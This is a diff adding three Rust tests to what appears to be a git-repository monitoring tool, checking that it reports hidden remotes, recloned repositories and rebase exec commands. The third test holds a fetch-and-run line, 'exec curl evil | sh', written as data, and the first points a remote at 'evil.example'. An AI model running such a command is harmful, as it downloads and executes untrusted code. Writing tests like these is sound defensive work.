@@ -613,3 +613,68 @@ fn issue_874_long_reports_are_cut() {
     assert!(message.contains("and 5 more"), "{message}");
     assert!(!message.contains("remotes/r24"), "{message}");
 }
+
+/// Review r4 (S1'): a remote hidden behind an unreadable git folder is
+/// reported once the folder can be read again.
+#[test]
+fn issue_874_a_remote_behind_an_unreadable_git_folder_is_reported() {
+    if unsafe { libc::geteuid() } == 0 {
+        return;
+    }
+    let project = Project::new();
+    let git = project.git();
+    let (thread, repos) = baseline(&project);
+    std::fs::create_dir_all(git.join("remotes")).expect("remotes");
+    std::fs::write(
+        git.join("remotes/upstream"),
+        "URL: https://evil.example/x\n",
+    )
+    .expect("remote");
+    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o000)).expect("chmod");
+    let hidden = check(thread, &repos);
+    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o755)).expect("chmod");
+    assert_eq!(
+        kinds(&hidden),
+        vec![format!("incomplete {}", git.display())]
+    );
+    assert_eq!(
+        kinds(&check(thread, &repos)),
+        vec![format!("remote {}", git.join("remotes/upstream").display())]
+    );
+}
+
+/// Review r4 (nit 3): a repository deleted and cloned again in the same
+/// place gets a first look, not "replaced".
+#[test]
+fn issue_874_a_recloned_repository_gets_a_first_look() {
+    let project = Project::new();
+    let git = project.git();
+    let (thread, repos) = baseline(&project);
+    std::fs::remove_dir_all(&git).expect("delete");
+    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
+    std::fs::create_dir_all(git.join("objects")).expect("clone");
+    std::fs::create_dir_all(git.join("refs/heads")).expect("clone");
+    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
+    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
+    assert_eq!(project.held(), Vec::<String>::new());
+}
+
+/// Review r4 (nit 5): a rebase with `-x` is reported when a command line
+/// appears, not at each step.
+#[test]
+fn issue_874_a_rebase_is_reported_when_a_command_appears() {
+    let project = Project::new();
+    let git = project.git();
+    let (thread, repos) = baseline(&project);
+    let todo = git.join("rebase-merge/git-rebase-todo");
+    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
+    std::fs::write(&todo, "pick 1\nexec make\npick 2\nexec make test\n").expect("todo");
+    assert_eq!(check(thread, &repos).len(), 1);
+    std::fs::write(&todo, "pick 2\nexec make test\n").expect("step");
+    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
+    std::fs::write(&todo, "pick 2\nexec make test\nexec curl evil | sh\n").expect("added");
+    assert_eq!(
+        kinds(&check(thread, &repos)),
+        vec![format!("exec {}", todo.display())]
+    );
+}
